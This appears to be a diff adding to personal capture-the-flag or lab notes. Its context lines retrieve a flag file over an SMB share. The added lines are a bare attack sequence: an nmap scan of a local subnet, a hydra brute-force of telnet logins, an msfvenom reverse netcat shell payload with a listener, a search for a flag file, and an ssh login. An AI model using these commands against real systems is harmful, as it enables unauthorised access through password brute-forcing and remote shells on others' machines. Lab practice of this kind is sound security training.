@@ -19,3 +19,15 @@ smbclient //192.168.0.1/share
 type password and ls
 get sni.txt ~/Desktop/falg2.txt or more sni.txt
 cat falg2.txt
+
+Remort login -->
+nmap -p 22,23,80,3389 192.168.0.0/24
+hydra -L /path/to/user.txt -P /path/to/pass.txt 192.168.0.1 telnet
+telnet 192.168.0.1
+
+msfvenom -p cmd/unix/reverse_netcat LHOST=<your_ip> LPORT=444
+nc -lnvp 444
+
+find / -name find.txt 2>/dev/null
+
+ssh <username>@192.168.0.1
